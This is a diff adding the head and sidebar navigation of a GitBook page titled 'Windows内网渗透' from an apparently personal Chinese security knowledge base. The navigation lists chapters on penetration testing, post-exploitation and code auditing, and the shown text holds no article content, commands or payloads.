@@ -1,0 +1,3258 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Windows内网渗透 · Khaz's 知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Khaz">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro-fixed/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-d4t/style.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="入侵痕迹清理.html" />
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="header-inner">
+        <!-- LOGO -->
+        <a href="/"><div class="logo"></div></a>
+        <span class="title"></span>
+
+        <!-- Search -->
+        
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+
+        <!-- Nav -->
+        <ul class="header-nav">
+            
+        </ul>
+    </div>
+
+    <div class="book-summary">
+        <div class="sidebar-nav-space"></div>
+        
+        
+        <nav role="navigation">
+            
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    01.渗透测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" >
+            
+                <span>
+            
+                    
+                    01.信息收集
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../01.渗透测试/01.信息收集/01.资产收集.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/01.资产收集.html">
+            
+                    
+                    01.资产收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../01.渗透测试/01.信息收集/02.指纹识别.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/02.指纹识别.html">
+            
+                    
+                    02.指纹识别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../01.渗透测试/01.信息收集/03.敏感信息收集.html">
+            
+                <a href="../../01.渗透测试/01.信息收集/03.敏感信息收集.html">
+            
+                    
+                    03.敏感信息收集
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" >
+            
+                <span>
+            
+                    
+                    02.Web安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" >
+            
+                <span>
+            
+                    
+                    01.Sql注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1" >
+            
+                <span>
+            
+                    
+                    Mysql
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.1.1" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.html">
+            
+                    
+                    Mysql基础操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.1.2" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.html">
+            
+                    
+                    Sql注入详解--Mysql
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.2" >
+            
+                <span>
+            
+                    
+                    Sql Server
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1.2.1" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.html">
+            
+                    
+                    Sql注入--MSSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.1.3" data-path="../../01.渗透测试/02.Web安全/01.Sql注入/配合其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/01.Sql注入/配合其他.html">
+            
+                    
+                    配合其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" >
+            
+                <span>
+            
+                    
+                    02.文件操作
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1" >
+            
+                <span>
+            
+                    
+                    文件上传
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.2.1.1" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.2" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/02.黑名单绕过.html">
+            
+                    
+                    02.黑名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.3" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/03.白名单绕过.html">
+            
+                    
+                    03.白名单绕过
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.1.4" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件上传/04.WebShell上传.html">
+            
+                    
+                    04.WebShell上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.2" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件包含.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.3" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件读取和下载.html">
+            
+                    
+                    任意文件读取和下载
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2.4" data-path="../../01.渗透测试/02.Web安全/02.文件操作/文件预览.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/02.文件操作/文件预览.html">
+            
+                    
+                    文件预览
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" >
+            
+                <span>
+            
+                    
+                    03.命令注入
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.3.1" data-path="../../01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/01.漏洞了解.html">
+            
+                    
+                    01.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.2" data-path="../../01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/02.漏洞利用.html">
+            
+                    
+                    02.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3.3" data-path="../../01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/03.命令注入/03.Dnslog.html">
+            
+                    
+                    03.Dnslog
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" >
+            
+                <span>
+            
+                    
+                    04.跨站脚本攻击
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.4.1" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.2" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/02.漏洞了解.html">
+            
+                    
+                    02.漏洞了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4.3" data-path="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/04.跨站脚本攻击/03.漏洞利用.html">
+            
+                    
+                    03.漏洞利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5" >
+            
+                <span>
+            
+                    
+                    05.身份认证
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.5.1" data-path="../../01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/00.前置知识.html">
+            
+                    
+                    00.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.2" data-path="../../01.渗透测试/02.Web安全/05.身份认证/01.登录框.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/01.登录框.html">
+            
+                    
+                    01.登录框
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.3" data-path="../../01.渗透测试/02.Web安全/05.身份认证/02.越权.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/02.越权.html">
+            
+                    
+                    02.越权
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.4" data-path="../../01.渗透测试/02.Web安全/05.身份认证/03.JWT.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/03.JWT.html">
+            
+                    
+                    JWT安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.5" data-path="../../01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/04.OAUTH.html">
+            
+                    
+                    04.OAUTH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.5.6" data-path="../../01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/05.身份认证/05.一些案例.html">
+            
+                    
+                    05.一些案例
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6" >
+            
+                <span>
+            
+                    
+                    06.API接口测试
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.6.1" data-path="../../01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/06.API接口测试/01.前置知识.html">
+            
+                    
+                    01.前置知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.6.2" data-path="../../01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/06.API接口测试/03.Tips.html">
+            
+                    
+                    03.Tips
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.7" >
+            
+                <span>
+            
+                    
+                    07.SSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.7.1" data-path="../../01.渗透测试/02.Web安全/07.SSRF/SSRF.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/07.SSRF/SSRF.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8" >
+            
+                <span>
+            
+                    
+                    08.JSONP与CORS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.8.1" data-path="../../01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/08.JSONP与CORS/CORS.html">
+            
+                    
+                    CORS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.8.2" data-path="../../01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/08.JSONP与CORS/JSONP跨域漏洞.html">
+            
+                    
+                    JSONP跨域漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.9" >
+            
+                <span>
+            
+                    
+                    09.CSRF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.9.1" data-path="../../01.渗透测试/02.Web安全/09.CSRF/CSRF.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/09.CSRF/CSRF.html">
+            
+                    
+                    CSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.10" >
+            
+                <span>
+            
+                    
+                    10.XXE
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.10.1" data-path="../../01.渗透测试/02.Web安全/10.XXE/XXE.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/10.XXE/XXE.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11" >
+            
+                <span>
+            
+                    
+                    11.逻辑漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.11.1" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/01.短信验证码与图形验证码.html">
+            
+                    
+                    01.短信验证码与图形验证码
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.2" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html">
+            
+                    
+                    02.任意用户密码重置
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.3" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html">
+            
+                    
+                    03.支付漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.11.4" data-path="../../01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html">
+            
+                    
+                    04.其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.12" >
+            
+                <span>
+            
+                    
+                    12.微信小程序
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.12.1" data-path="../../01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html">
+            
+                    
+                    小程序与公众号
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.13" >
+            
+                <span>
+            
+                    
+                    13.前端加密对抗
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.13.1" data-path="../../01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html">
+            
+                    
+                    前端加密渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.14" data-path="../../01.渗透测试/02.Web安全/AI大模型.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/AI大模型.html">
+            
+                    
+                    AI大模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.15" data-path="../../01.渗透测试/02.Web安全/Waf绕过学习.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/Waf绕过学习.html">
+            
+                    
+                    WAF绕过学习
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.16" data-path="../../01.渗透测试/02.Web安全/其他.html">
+            
+                <a href="../../01.渗透测试/02.Web安全/其他.html">
+            
+                    
+                    其他
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" >
+            
+                <span>
+            
+                    
+                    03.云安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../01.渗透测试/03.云安全/云安全.html">
+            
+                <a href="../../01.渗透测试/03.云安全/云安全.html">
+            
+                    
+                    云安全
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    04.移动安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../../01.渗透测试/04.移动安全/APP渗透.html">
+            
+                <a href="../../01.渗透测试/04.移动安全/APP渗透.html">
+            
+                    
+                    APP渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../../01.渗透测试/04.移动安全/环境.html">
+            
+                <a href="../../01.渗透测试/04.移动安全/环境.html">
+            
+                    
+                    环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    05.漏洞复现
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../01.渗透测试/05.漏洞复现/Mysql%20Client 任意文件读取攻击.md">
+            
+                <span>
+            
+                    
+                    Mysql Client 任意文件读取攻击复现
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../01.渗透测试/05.漏洞复现/Redis漏洞.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Redis漏洞.html">
+            
+                    
+                    Redis漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../01.渗透测试/05.漏洞复现/shiro漏洞.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/shiro漏洞.html">
+            
+                    
+                    Shiro漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../01.渗透测试/05.漏洞复现/spring漏洞复现.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/spring漏洞复现.html">
+            
+                    
+                    Spring框架漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../01.渗透测试/05.漏洞复现/Tomcat.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Tomcat.html">
+            
+                    
+                    Tomcat漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.6" data-path="../../01.渗透测试/05.漏洞复现/Weblogic.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/Weblogic.html">
+            
+                    
+                    Weblogic漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.7" data-path="../../01.渗透测试/05.漏洞复现/应用记录.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/应用记录.html">
+            
+                    
+                    渗透中常见应用记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.8" data-path="../../01.渗透测试/05.漏洞复现/若依漏洞复现.html">
+            
+                <a href="../../01.渗透测试/05.漏洞复现/若依漏洞复现.html">
+            
+                    
+                    若依漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    02.后渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../Linux/Linux渗透.html">
+            
+                <a href="../Linux/Linux渗透.html">
+            
+                    
+                    Linux渗透总结
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" >
+            
+                <span>
+            
+                    
+                    Windows域渗透
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.3.2.1" data-path="Windows内网渗透.html">
+            
+                <a href="Windows内网渗透.html">
+            
+                    
+                    Windows内网渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.2" data-path="入侵痕迹清理.html">
+            
+                <a href="入侵痕迹清理.html">
+            
+                    
+                    入侵痕迹清理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.3" data-path="后渗透之了解.html">
+            
+                <a href="后渗透之了解.html">
+            
+                    
+                    后渗透之了解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.4" data-path="后渗透之基础知识.html">
+            
+                <a href="后渗透之基础知识.html">
+            
+                    
+                    后渗透之基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.5" data-path="后渗透之权限提升.html">
+            
+                <a href="后渗透之权限提升.html">
+            
+                    
+                    后渗透之权限提升
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2.6" data-path="后渗透之权限维持.html">
+            
+                <a href="后渗透之权限维持.html">
+            
+                    
+                    后渗透之权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" >
+            
+                <span>
+            
+                    
+                    社会工程学
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1" >
+            
+                <span>
+            
+                    
+                    近源
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.1.1" data-path="../社会工程学/近源/BadUsb.html">
+            
+                <a href="../社会工程学/近源/BadUsb.html">
+            
+                    
+                    近源渗透之BadUSB
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3.2" >
+            
+                <span>
+            
+                    
+                    钓鱼
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.3.2.1" data-path="../社会工程学/钓鱼/SPF伪造.html">
+            
+                <a href="../社会工程学/钓鱼/SPF伪造.html">
+            
+                    
+                    初探邮件钓鱼
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../隧道搭建.html">
+            
+                <a href="../隧道搭建.html">
+            
+                    
+                    端口转发与代理搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" >
+            
+                <span>
+            
+                    
+                    03.代码审计
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" >
+            
+                <span>
+            
+                    
+                    .Net
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="../../03.代码审计/.Net/.net渗透.html">
+            
+                <a href="../../03.代码审计/.Net/.net渗透.html">
+            
+                    
+                    .net渗透
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" >
+            
+                <span>
+            
+                    
+                    JAVA
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" >
+            
+                <span>
+            
+                    
+                    01.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1.1" data-path="../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java反射.html">
+            
+                    
+                    Java反射
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.2" data-path="../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java泛型.html">
+            
+                    
+                    Java泛型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.3" data-path="../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/Java类加载器.html">
+            
+                    
+                    Java类加载器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.1.4" data-path="../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                <a href="../../03.代码审计/JAVA/01.基础知识/SPI.html">
+            
+                    
+                    SPI
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" >
+            
+                <span>
+            
+                    
+                    02.基础漏洞
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.2.1" data-path="../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/代码注入.html">
+            
+                    
+                    代码注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.2" data-path="../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/命令注入.html">
+            
+                    
+                    命令注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.3" data-path="../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
